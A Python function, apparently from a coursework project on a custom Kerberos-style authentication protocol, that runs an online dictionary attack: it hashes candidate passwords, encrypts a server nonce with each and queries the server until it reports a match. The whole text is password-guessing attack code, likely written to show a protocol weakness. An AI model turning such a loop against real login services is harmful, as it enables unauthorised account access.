def perform_dictionary_attack(client):
    # Loop over all passwords in the known passwords dictionary
    for password in known_passwords:
        # Calculate the hash of the password
        hashed_password = hashlib.sha256(password.encode('utf-8')).hexdigest()

        # Perform the attack on the current password in the loop
        nonce = None
        encrypted_nonce = None
        for server in client.server_list:
            try:
                # Create a connection to the server
                auth_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                auth_sock.connect((client.auth_server_ip, client.auth_server_port))

                # Retrieve nonce from the server
                nonce_request_data = r.MyRequest.request_nonce(client.client_id, server['server_id'])
                auth_sock.send(nonce_request_data)
                response = auth_sock.recv(1024)
                header, payload = client.encryption_helper.unpack_auth(HeadersFormat.AUTH_RESP_HEADER.value, response)
                if header[1] != ResponseAuth.RESPONSE_NONCE:
                    print("Error: Nonce retrieval failed.")
                    return

                # Save the nonce
                nonce = payload

                # Encrypt the nonce with the current password in the loop
                encrypted_nonce = client.encryption_helper.encrypt_message(nonce, hashed_password,
                                                                           client.encryption_helper.generate_iv())

                # Close the connection to the server
                auth_sock.close()

                break  # Exit the loop if encrypting the nonce succeeded
            except Exception as e:
                print(f"Error occurred: {e}")

        if nonce is None or encrypted_nonce is None:
            print(f"Failed to retrieve nonce for password: {password}")
            continue

        # Loop over all servers to check the encryption of the nonce
        for server in client.server_list:
            try:
                # Create a connection to the server
                auth_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                auth_sock.connect((client.auth_server_ip, client.auth_server_port))

                # Send a request to check the encrypted nonce
                encrypted_nonce_request_data = r.MyRequest.check_encrypted_nonce(client.client_id, server['server_id'],
                                                                                 encrypted_nonce)
                auth_sock.send(encrypted_nonce_request_data)
                response = auth_sock.recv(1024)

                # Check the server response
                header, _ = client.encryption_helper.unpack_auth(HeadersFormat.AUTH_RESP_HEADER.value, response)
                if header[1] == ResponseAuth.RESPONSE_NONCE_MATCH:
                    print(f"Password found: {password}")
                    return  # Exit the program if the password is found
            except Exception as e:
                print(f"Error occurred: {e}")
            finally:
                auth_sock.close()  # Close the connection to the server
